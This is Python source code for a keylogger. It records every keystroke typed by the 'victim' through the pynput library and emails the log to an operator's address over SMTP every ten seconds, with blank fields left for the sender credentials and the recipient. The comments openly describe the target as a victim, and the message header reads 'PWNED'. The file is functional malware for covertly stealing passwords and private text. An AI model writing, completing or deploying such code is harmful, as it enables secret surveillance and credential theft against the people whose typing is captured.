#imports
from pynput.keyboard import Key, Listener
import smtplib, threading, time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

count = 0 #count number of words
stack = [] #store 10 words then sent email
flag = True


def send_mail():
    global flag
    time.sleep(10) #send mail every ( ) seconds
    flag = True #able to call send_mail again
    address='' #put email used to sent keystrokes here
    password='' #put ^ email password
    receivers = [''] #put email that receives key strokes here
    message = """From: PWNED <>
To: <>
Subject: SMTP e-mail test

""" + " ".join(stack) #keystrokes from list turned to string
    
    #set up SMTP server
    s = smtplib.SMTP(host='smtp-mail.outlook.com', port=587) #use appropraite mail server and port
    s.ehlo()
    s.starttls()
    s.login(address, password)
    s.sendmail(address, receivers, message)
    s.quit()

#respond to press commands
def on_press(key):
    write_list(str(key))
    
def write_list(key):
    global count
    global stack
    global flag

    #sent mail every 10 seconds
    if flag:
        flag = False
        threadObj = threading.Thread(target=send_mail) #threading
        threadObj.start()
        
    #at 10 words start new line
    if count == 9:
        count = 0
        stack.append("\n")

    #if victim types space input a actual space
    if key == 'Key.space':
        stack.append(" ")
        count+=1

    #Victim Press enter go to new line.
    elif key == 'Key.enter':
        stack.append("\n")
        count = 0

    #I do not want "Key.enter, Key.shift etc.." in my output
    elif not(key.startswith('Key.')):
        key = key.replace("'", "")
        stack.append(key)

#press esc to exit program           
def on_release(key):
    if key == Key.esc:
        sent_mail()
        return False

#do not completely understand how this works found in Python Documentation   
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
